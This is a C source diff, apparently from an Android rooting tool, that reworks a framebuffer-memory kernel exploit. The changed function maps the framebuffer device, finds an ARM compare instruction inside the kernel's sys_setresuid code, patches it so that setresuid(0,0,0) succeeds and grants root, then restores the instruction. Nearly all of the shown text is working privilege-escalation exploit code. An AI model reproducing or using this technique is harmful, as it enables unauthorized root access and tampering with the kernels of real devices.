@@ -24,6 +24,7 @@
 #include <fcntl.h>
 #include <errno.h>
 #include <sys/system_properties.h>
+#include <sys/mman.h>
 
 #include "libdiagexploit/diag.h"
 #include "perf_swevent.h"
@@ -154,21 +155,38 @@ attempt_diag_exploit(unsigned long int sys_setresuid_address)
   return (ret == 0);
 }
 
+static uint32_t cmp_operation_code = 0xe3500000;
 static bool
 attempt_fb_mem_exploit(unsigned long int sys_setresuid_address)
 {
   int ret;
+  int fd;
+  void *mapped_address;
+  void *mapped_sys_setresuid_address;
+  int *cmp_operation;
 
   printf("Attempt fb mem exploit...\n");
 
-  fb_mem_set_kernel_phys_offset(0x200000);
+  mapped_address = fb_mem_mmap(&fd);
+  if (mapped_address == MAP_FAILED) {
+    printf("Failed to mmap due to %s\n", strerror(errno));
 
-  if (!fb_mem_write_value_at_address(sys_setresuid_address + 0x40, 0x0a000020)) {
+    fb_mem_munmap(mapped_address, fd);
     return false;
   }
 
+  mapped_sys_setresuid_address = fb_mem_convert_to_mmaped_address((void*)sys_setresuid_address, mapped_address);
+  cmp_operation = memmem(mapped_sys_setresuid_address, 0x100, &cmp_operation_code, sizeof(cmp_operation_code));
+
+  if (*cmp_operation == cmp_operation_code) {
+    *cmp_operation = cmp_operation_code + 1;
+  }
+
   ret = setresuid(0, 0, 0);
-  fb_mem_write_value_at_address(sys_setresuid_address + 0x40, 0x1a000020);
+
+  *cmp_operation = cmp_operation_code;
+
+  fb_mem_munmap(mapped_address, fd);
 
   return (ret == 0);
 }
